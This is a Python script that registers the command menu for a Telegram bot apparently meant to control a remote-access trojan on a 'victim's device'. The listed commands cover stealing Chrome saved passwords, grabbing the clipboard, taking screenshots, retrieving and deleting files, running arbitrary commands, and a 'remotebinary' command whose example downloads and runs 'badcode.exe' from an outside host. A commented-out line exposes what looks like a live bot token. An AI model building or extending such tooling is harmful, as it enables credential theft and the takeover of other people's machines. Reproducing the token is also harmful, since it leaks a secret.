import json, requests

# tele api token here
apiToken = "token"


cmds = {
        "commands": [
            {
                "command": "location",
                "description": "Grabs IP and some whois info"
            
            },
            
            {
                "command": "whoami",
                "description": "Grabs basic info about windows user"
            },

            {
                "command": "screenshot",
                "description": "Screenshots users screen, example: /screenshot 2"
            },

            {
                "command": "remotebinary",
                "description": "Downloads an external file & executes it. example: /execute https://b00136066.com/badcode.exe will execute badcode.exe"
            },

            {
                "command": "processes",
                "description": "list of the running processes."
            },

            {
                "command": "delete",
                "description": "Delete a specified file. example: /delete USERPROFILE\\Desktop\\youn.txt"
            },

            {
                "command": "gather",
                "description": "retrieve a specified file. example /retrieve USERPROFILE\\Desktop\\file.txt"
            },

            {
                "command": "metadata",
                "description": "retrieves metadata about the specified file. example: /metadata USERPROFILE\\Desktop\\TUD\\photoofme.png"
            },

            {
                "command": "ls",
                "description": "list the files in the current directory"
            },

            {
                "command": "execute",
                "description": "Execute a cmd. example: /cmd ls [-l,-h] or /cmd ls [] to execute ls with no arguments"
            },

            {
                "command": "power",
                "description": "shutdown, restart, or hibernate machine"
            },

            {
                "command": "playnoise",
                "description": "play sound on victim's device"
            },

            {
                "command": "chromepass",
                "description": "chrome saved password stealer"
            },

            {
                "command": "report",
                "description": "provide full hardware/software report"
            },

            {
                "command": "gatherclip",
                "description": "copied data from clipboard"
            },
            
            {
                "command": "messagebox",
                "description": "msgbox alert with custom title and description"
            },

            {
                "command": "wreport",
                "description": "provide wireless config info"
            }
            ]
        }

r = requests.post("https://api.telegram.org/bot" + apiToken + "/setMyCommands", json=cmds)
#r = requests.post("https://api.telegram.org/bot1581260146:AAFLWEi-bu-Em4M7g93YIq131TGrT0C6cJg/setMyCommands", json=data)
print(r.status_code)
print(r.text)